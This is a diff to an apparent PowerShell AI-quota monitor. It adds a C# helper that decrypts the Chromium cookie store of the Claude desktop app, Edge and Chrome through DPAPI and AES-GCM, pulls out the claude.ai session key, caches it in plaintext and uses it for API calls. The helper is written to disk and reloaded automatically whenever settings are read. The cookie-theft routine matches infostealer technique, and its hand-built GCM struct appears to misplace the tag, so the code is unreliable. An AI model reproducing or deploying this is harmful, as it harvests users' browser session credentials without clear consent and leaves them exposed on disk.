@@ -215,7 +215,7 @@ catch {
 
 function Get-DefaultClaudeCommand {
     return @'
-# TokenMonitorClaudeQuotaCommandVersion=3
+# TokenMonitorClaudeQuotaCommandVersion=4
 $credsPath = if ($env:CLAUDE_CONFIG_DIR) {
     Join-Path $env:CLAUDE_CONFIG_DIR ".credentials.json"
 } else {
@@ -223,8 +223,7 @@ $credsPath = if ($env:CLAUDE_CONFIG_DIR) {
 }
 
 if (-not (Test-Path -LiteralPath $credsPath)) {
-    [PSCustomObject]@{ Error = "No .credentials.json" } | ConvertTo-Json -Compress
-    exit
+    throw "No .credentials.json"
 }
 
 function Save-ClaudeCredentials {
@@ -354,8 +353,7 @@ try {
     $creds = Get-Content -LiteralPath $credsPath -Raw | ConvertFrom-Json
     $oauth = $creds.claudeAiOauth
     if (-not $oauth) {
-        [PSCustomObject]@{ Error = "No claudeAiOauth credentials" } | ConvertTo-Json -Compress
-        exit
+        throw "No claudeAiOauth credentials"
     }
 
     $token = Get-ClaudeOauthProperty -Oauth $oauth -Names @("accessToken", "access_token")
@@ -430,15 +428,359 @@ try {
     }
 }
 catch {
-    [PSCustomObject]@{ Error = $_.Exception.Message } | ConvertTo-Json -Compress
+    $cliError = $_.Exception.Message
+    try {
+        $appDir = Join-Path $env:APPDATA 'TokenMonitor'
+        $helperPath = Join-Path $appDir 'claude-cookie-helper.cs'
+        $cachePath = Join-Path $appDir 'claude-sessionkey.cache'
+        $sessionKey = $null
+        if (Test-Path $helperPath) {
+            if (-not ('ClaudeCookieReader' -as [type])) { Add-Type -Path $helperPath -ErrorAction SilentlyContinue }
+            try { $sessionKey = [ClaudeCookieReader]::ExtractSessionKeyFromAnySource() } catch { $sessionKey = $null }
+            if ($sessionKey) { $sessionKey | Out-File $cachePath -Encoding UTF8 -NoNewline }
+        }
+        if (-not $sessionKey -and (Test-Path $cachePath)) { $sessionKey = (Get-Content $cachePath -Raw).Trim() }
+        if (-not $sessionKey) { throw "No sessionKey (close Claude app/Edge once to allow extraction)" }
+        $h = @{ Cookie = "sessionKey=$sessionKey"; 'User-Agent' = 'Mozilla/5.0'; Accept = 'application/json' }
+        $orgs = Invoke-RestMethod -Uri 'https://claude.ai/api/organizations' -Headers $h -ErrorAction Stop
+        $uuid = $orgs[0].uuid
+        if (-not $uuid) { throw "No org UUID" }
+        $u = Invoke-RestMethod -Uri "https://claude.ai/api/organizations/$uuid/usage" -Headers $h -ErrorAction Stop
+        $f = $u.five_hour; if (-not $f) { $f = $u.fiveHour }
+        $w = $u.seven_day; if (-not $w) { $w = $u.sevenDay }
+        if (-not $f -and $u.usage) { $f = $u.usage.five_hour; $w = $u.usage.seven_day }
+        $fR = $f.resets_at; if (-not $fR) { $fR = $f.reset_at }
+        $wR = $w.resets_at; if (-not $wR) { $wR = $w.reset_at }
+        [PSCustomObject]@{ fiveHourUsedPercent = $f.utilization; weeklyUsedPercent = $w.utilization; fiveHourResetAt = $fR; weeklyResetAt = $wR } | ConvertTo-Json -Compress
+    }
+    catch {
+        [PSCustomObject]@{ Error = "CLI: $cliError | App: $($_.Exception.Message)" } | ConvertTo-Json -Compress
+    }
 }
 '@
+}
+
+function Get-ClaudeCookieHelperCs {
+    return @'
+// TokenMonitor Claude Cookie Helper v3
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Security.Cryptography;
+using Microsoft.Win32.SafeHandles;
+
+public class ClaudeCookieReader
+{
+    // ===== DPAPI =====
+    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    private static extern bool CryptUnprotectData(
+        ref DATA_BLOB pDataIn, string szDataDescr,
+        ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved,
+        ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
+        int dwFlags, ref DATA_BLOB pDataOut);
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct DATA_BLOB { public int cbData; public IntPtr pbData; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct CRYPTPROTECT_PROMPTSTRUCT { public int cbSize; public int dwPromptFlags; public IntPtr hwndApp; public string szPrompt; }
+
+    private static byte[] DPAPI_Unprotect(byte[] data)
+    {
+        GCHandle h = GCHandle.Alloc(data, GCHandleType.Pinned);
+        try
+        {
+            DATA_BLOB inBlob = new DATA_BLOB();
+            inBlob.cbData = data.Length;
+            inBlob.pbData = h.AddrOfPinnedObject();
+            DATA_BLOB outBlob = new DATA_BLOB();
+            CRYPTPROTECT_PROMPTSTRUCT ps = new CRYPTPROTECT_PROMPTSTRUCT();
+            if (!CryptUnprotectData(ref inBlob, null, ref inBlob, IntPtr.Zero, ref ps, 1, ref outBlob))
+                return null;
+            byte[] result = new byte[outBlob.cbData];
+            Marshal.Copy(outBlob.pbData, result, 0, outBlob.cbData);
+            Marshal.FreeHGlobal(outBlob.pbData);
+            return result;
+        }
+        finally { h.Free(); }
+    }
+
+    // ===== BCrypt (AES-GCM) =====
+    [DllImport("bcrypt.dll")]
+    private static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);
+
+    [DllImport("bcrypt.dll")]
+    private static extern uint BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
+
+    [DllImport("bcrypt.dll")]
+    private static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);
+
+    [DllImport("bcrypt.dll")]
+    private static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
+
+    [DllImport("bcrypt.dll")]
+    private static extern uint BCryptDestroyKey(IntPtr hKey);
+
+    [DllImport("bcrypt.dll")]
+    private static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);
+
+    private const uint BCRYPT_CHAIN_MODE_GCM = 0x00000007;
+    private const int BCRYPT_AUTH_TAG_LENGTH = 0x00000010;
+
+    private static byte[] AES_GCM_Decrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
+    {
+        IntPtr hAlg;
+        if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
+        try
+        {
+            byte[] mode = BitConverter.GetBytes(BCRYPT_CHAIN_MODE_GCM);
+            if (BCryptSetProperty(hAlg, "ChainingMode", mode, mode.Length, 0) != 0) return null;
+
+            IntPtr hKey;
+            if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;
+            try
+            {
+                // Authenticated cipher structure: nonce(12) + tag(16) at end
+                // BCrypt expects: pbIV points to nonce, tag is in padding info
+                // We use the simpler approach: combine into BCRYPT_AUTHENTICATED_CIPHER_MODE
+                // But that's complex. Instead, use the Chromium v10+ format:
+                // encrypted = version(3) + nonce(12) + ciphertext + tag(16)
+                // We already have nonce, ciphertext, and tag separated.
+
+                // Build the auth info structure manually
+                // BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO:
+                //   cbSize (4), dwInfoVersion (4), pbNonce (8), cbNonce (4), pbTag (8), cbTag (4), ...
+                int structSize = 56; // sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO) on x64
+                byte[] authInfo = new byte[structSize];
+                BitConverter.GetBytes(structSize).CopyTo(authInfo, 0);
+                BitConverter.GetBytes(1).CopyTo(authInfo, 4); // version
+                GCHandle hNonce = GCHandle.Alloc(nonce, GCHandleType.Pinned);
+                GCHandle hTag = GCHandle.Alloc(tag, GCHandleType.Pinned);
+                try
+                {
+                    BitConverter.GetBytes(hNonce.AddrOfPinnedObject().ToInt64()).CopyTo(authInfo, 8);
+                    BitConverter.GetBytes(nonce.Length).CopyTo(authInfo, 16);
+                    BitConverter.GetBytes(hTag.AddrOfPinnedObject().ToInt64()).CopyTo(authInfo, 24);
+                    BitConverter.GetBytes(tag.Length).CopyTo(authInfo, 32);
+
+                    IntPtr pAuthInfo = Marshal.AllocHGlobal(structSize);
+                    try
+                    {
+                        Marshal.Copy(authInfo, 0, pAuthInfo, structSize);
+                        byte[] output = new byte[ciphertext.Length];
+                        int resultLen;
+                        uint status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, pAuthInfo, null, 0, output, output.Length, out resultLen, 0);
+                        if (status != 0) return null;
+                        return output;
+                    }
+                    finally { Marshal.FreeHGlobal(pAuthInfo); }
+                }
+                finally { hNonce.Free(); hTag.Free(); }
+            }
+            finally { BCryptDestroyKey(hKey); }
+        }
+        finally { BCryptCloseAlgorithmProvider(hAlg, 0); }
+    }
+
+    // ===== Byte Search =====
+    private static int FindBytes(byte[] haystack, byte[] needle, int start)
+    {
+        for (int i = start; i <= haystack.Length - needle.Length; i++)
+        {
+            bool found = true;
+            for (int j = 0; j < needle.Length; j++)
+            {
+                if (haystack[i + j] != needle[j]) { found = false; break; }
+            }
+            if (found) return i;
+        }
+        return -1;
+    }
+
+    // ===== Cookie Extraction from a single user-data directory =====
+    private static string TryExtractFromUserData(string userDataPath, string profileName)
+    {
+        try
+        {
+            // 1. Read encrypted_key from Local State
+            string localStatePath = Path.Combine(userDataPath, "Local State");
+            if (!File.Exists(localStatePath)) return null;
+
+            string json = File.ReadAllText(localStatePath);
+            string keyField = "\"encrypted_key\":\"";
+            int idx = json.IndexOf(keyField);
+            if (idx < 0) return null;
+            idx += keyField.Length;
+            int end = json.IndexOf('"', idx);
+            if (end < 0) return null;
+            string encryptedKeyB64 = json.Substring(idx, end - idx);
+
+            byte[] encryptedKey = Convert.FromBase64String(encryptedKeyB64);
+            if (encryptedKey.Length < 5) return null;
+            byte[] keyPlain = DPAPI_Unprotect(encryptedKey);
+            if (keyPlain == null || keyPlain.Length != 32) return null;
+
+            // 2. Read cookie DB
+            string cookieDbPath = Path.Combine(userDataPath, profileName, "Network", "Cookies");
+            if (!File.Exists(cookieDbPath)) return null;
+
+            byte[] dbData;
+            try { dbData = File.ReadAllBytes(cookieDbPath); }
+            catch
+            {
+                string tmpPath = Path.GetTempFileName();
+                try
+                {
+                    using (var src = new FileStream(cookieDbPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
+                    using (var dst = File.Create(tmpPath)) { src.CopyTo(dst); }
+                    dbData = File.ReadAllBytes(tmpPath);
+                }
+                catch { return null; }
+                finally { try { File.Delete(tmpPath); } catch { } }
+            }
+
+            // 3. Find sessionKey cookie for claude.ai
+            return SearchSessionKeyInDb(dbData, keyPlain);
+        }
+        catch { return null; }
+    }
+
+    private static string SearchSessionKeyInDb(byte[] dbData, byte[] keyPlain)
+    {
+        byte[] hostBytes = Encoding.UTF8.GetBytes("claude.ai");
+        byte[] nameBytes = Encoding.UTF8.GetBytes("sessionKey");
+
+        int searchPos = 0;
+        while (true)
+        {
+            int hostPos = FindBytes(dbData, hostBytes, searchPos);
+            if (hostPos < 0) break;
+            searchPos = hostPos + 1;
+
+            int regionStart = Math.Max(0, hostPos - 200);
+            int nameRelPos = FindBytes(dbData, nameBytes, regionStart);
+            if (nameRelPos < 0 || nameRelPos > hostPos + 600) continue;
+
+            int afterName = nameRelPos + nameBytes.Length;
+            byte[] v10prefix = { (byte)'v', (byte)'1', (byte)'0' };
+            int encStart = FindBytes(dbData, v10prefix, afterName);
+            if (encStart < 0 || encStart > afterName + 2000) continue;
+
+            for (int totalBlobLen = 100; totalBlobLen <= 2048; totalBlobLen += 32)
+            {
+                if (encStart + 3 + totalBlobLen > dbData.Length) break;
+                byte[] blob = new byte[totalBlobLen];
+                Array.Copy(dbData, encStart + 3, blob, 0, totalBlobLen);
+                if (blob.Length < 28) continue;
+
+                byte[] nonce = new byte[12];
+                byte[] tag = new byte[16];
+                byte[] ct = new byte[blob.Length - 28];
+                Array.Copy(blob, 0, nonce, 0, 12);
+                Array.Copy(blob, blob.Length - 16, tag, 0, 16);
+                Array.Copy(blob, 12, ct, 0, ct.Length);
+
+                byte[] decrypted = AES_GCM_Decrypt(keyPlain, nonce, ct, tag);
+                if (decrypted != null)
+                {
+                    string result = Encoding.UTF8.GetString(decrypted).TrimEnd('\0');
+                    if (result.Length > 10 && result.StartsWith("sk-ant-sid01-"))
+                        return result;
+                }
+            }
+        }
+        return null;
+    }
+
+    // ===== Main Entry Point: search Claude app first, then Edge, then Chrome =====
+    public static string ExtractSessionKey(string edgeUserDataPath, string profileName)
+    {
+        // Kept for backward compatibility - delegates to TryExtractFromUserData
+        return TryExtractFromUserData(edgeUserDataPath, profileName);
+    }
+
+    // ===== Search all known browser/app locations for the sessionKey =====
+    public static string ExtractSessionKeyFromAnySource()
+    {
+        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+
+        // 1. Claude desktop app (MSIX package: %LOCALAPPDATA%\Packages\Claude_*\LocalCache\Roaming\Claude)
+        try
+        {
+            string packagesDir = Path.Combine(localAppData, "Packages");
+            if (Directory.Exists(packagesDir))
+            {
+                foreach (string dir in Directory.GetDirectories(packagesDir, "Claude_*"))
+                {
+                    string claudeAppData = Path.Combine(dir, "LocalCache", "Roaming", "Claude");
+                    if (Directory.Exists(claudeAppData))
+                    {
+                        // Claude app stores cookies directly in <appData>/Network/Cookies (no profile subfolder)
+                        string result = TryExtractFromUserData(claudeAppData, "");
+                        if (!string.IsNullOrEmpty(result)) return result;
+                    }
+                }
+            }
+        }
+        catch { }
+
+        // 2. Edge browser
+        try
+        {
+            string edgeDir = Path.Combine(localAppData, "Microsoft", "Edge", "User Data");
+            if (Directory.Exists(edgeDir))
+            {
+                foreach (string p in new[] { "Default", "Profile 1", "Profile 2", "Profile 3" })
+                {
+                    string result = TryExtractFromUserData(edgeDir, p);
+                    if (!string.IsNullOrEmpty(result)) return result;
+                }
+            }
+        }
+        catch { }
+
+        // 3. Chrome browser
+        try
+        {
+            string chromeDir = Path.Combine(localAppData, "Google", "Chrome", "User Data");
+            if (Directory.Exists(chromeDir))
+            {
+                foreach (string p in new[] { "Default", "Profile 1", "Profile 2", "Profile 3" })
+                {
+                    string result = TryExtractFromUserData(chromeDir, p);
+                    if (!string.IsNullOrEmpty(result)) return result;
+                }
+            }
+        }
+        catch { }
+
+        return null;
+    }
+}
+'@
+}
+
+function Save-ClaudeCookieHelper {
+    $appDir = Get-TokenMonitorAppDir
+    $helperPath = Join-Path $appDir 'claude-cookie-helper.cs'
+    $csCode = Get-ClaudeCookieHelperCs
+    $versionLine = ($csCode -split "`n")[0].Trim()
+    $needsSave = $true
+    if (Test-Path $helperPath) {
+        $existing = (Get-Content $helperPath -TotalCount 1).Trim()
+        if ($existing -eq $versionLine) { $needsSave = $false }
+    }
+    if ($needsSave) {
+        $csCode | Set-Content -LiteralPath $helperPath -Encoding UTF8
+    }
 }
 
 function New-DefaultTokenSettings {
     $defaultGeminiCommand = Get-DefaultAntigravityCommand
     $defaultCodexCommand = '$authPath = "$env:USERPROFILE\.codex\auth.json"; if (-not (Test-Path -LiteralPath $authPath)) { [PSCustomObject]@{ Error = "No auth.json" } | ConvertTo-Json -Compress; exit }; try { $auth = Get-Content -LiteralPath $authPath -Raw | ConvertFrom-Json; $token = $auth.tokens.access_token; if (-not $token) { [PSCustomObject]@{ Error = "Not logged in" } | ConvertTo-Json -Compress; exit }; $headers = @{ Authorization = "Bearer $token"; "User-Agent" = "Mozilla/5.0" }; $resp = Invoke-RestMethod -Uri "https://chatgpt.com/backend-api/wham/usage" -Headers $headers -ErrorAction Stop; if ($resp) { $p = $resp.rate_limit.primary_window; $s = $resp.rate_limit.secondary_window; $pReset = $p.resets_at; if (-not $pReset) { $pReset = $p.reset_at }; if (-not $pReset) { $pReset = $p.resetsAt }; $sReset = $s.resets_at; if (-not $sReset) { $sReset = $s.reset_at }; if (-not $sReset) { $sReset = $s.resetsAt }; [PSCustomObject]@{ fiveHourUsedPercent = $p.used_percent; weeklyUsedPercent = $s.used_percent; fiveHourResetAt = $pReset; weeklyResetAt = $sReset } | ConvertTo-Json -Compress } else { [PSCustomObject]@{ Error = "Empty API response" } | ConvertTo-Json -Compress } } catch { [PSCustomObject]@{ Error = $_.Exception.Message } | ConvertTo-Json -Compress }'
     $defaultClaudeCommand = Get-DefaultClaudeCommand
+    Save-ClaudeCookieHelper
 
     return [ordered]@{
         RefreshSeconds = 60
@@ -494,6 +836,8 @@ function Save-TokenMonitorSettings {
 
 function Read-TokenMonitorSettings {
     param([string]$Path = (Get-TokenMonitorSettingsPath))
+
+    Save-ClaudeCookieHelper
 
     $defaultGeminiCommand = Get-DefaultAntigravityCommand
     $defaultCodexCommand = '$authPath = "$env:USERPROFILE\.codex\auth.json"; if (-not (Test-Path -LiteralPath $authPath)) { [PSCustomObject]@{ Error = "No auth.json" } | ConvertTo-Json -Compress; exit }; try { $auth = Get-Content -LiteralPath $authPath -Raw | ConvertFrom-Json; $token = $auth.tokens.access_token; if (-not $token) { [PSCustomObject]@{ Error = "Not logged in" } | ConvertTo-Json -Compress; exit }; $headers = @{ Authorization = "Bearer $token"; "User-Agent" = "Mozilla/5.0" }; $resp = Invoke-RestMethod -Uri "https://chatgpt.com/backend-api/wham/usage" -Headers $headers -ErrorAction Stop; if ($resp) { $p = $resp.rate_limit.primary_window; $s = $resp.rate_limit.secondary_window; $pReset = $p.resets_at; if (-not $pReset) { $pReset = $p.reset_at }; if (-not $pReset) { $pReset = $p.resetsAt }; $sReset = $s.resets_at; if (-not $sReset) { $sReset = $s.reset_at }; if (-not $sReset) { $sReset = $s.resetsAt }; [PSCustomObject]@{ fiveHourUsedPercent = $p.used_percent; weeklyUsedPercent = $s.used_percent; fiveHourResetAt = $pReset; weeklyResetAt = $sReset } | ConvertTo-Json -Compress } else { [PSCustomObject]@{ Error = "Empty API response" } | ConvertTo-Json -Compress } } catch { [PSCustomObject]@{ Error = $_.Exception.Message } | ConvertTo-Json -Compress }'
@@ -587,7 +931,7 @@ function Read-TokenMonitorSettings {
                 ([string]$provider.Command).IndexOf('https://platform.claude.com/v1/oauth/token', [StringComparison]::OrdinalIgnoreCase) -lt 0 -or
                 ([string]$provider.Command).IndexOf('Set-ClaudeOauthProperty', [StringComparison]::OrdinalIgnoreCase) -lt 0 -or
                 ([string]$provider.Command).IndexOf('refreshRateLimitedUntil', [StringComparison]::OrdinalIgnoreCase) -lt 0 -or
-                ([string]$provider.Command).IndexOf('TokenMonitorClaudeQuotaCommandVersion=3', [StringComparison]::OrdinalIgnoreCase) -lt 0)) {
+                ([string]$provider.Command).IndexOf('TokenMonitorClaudeQuotaCommandVersion=4', [StringComparison]::OrdinalIgnoreCase) -lt 0)) {
                 $provider.Command = $defaultClaudeCommand
                 $migrated = $true
             }
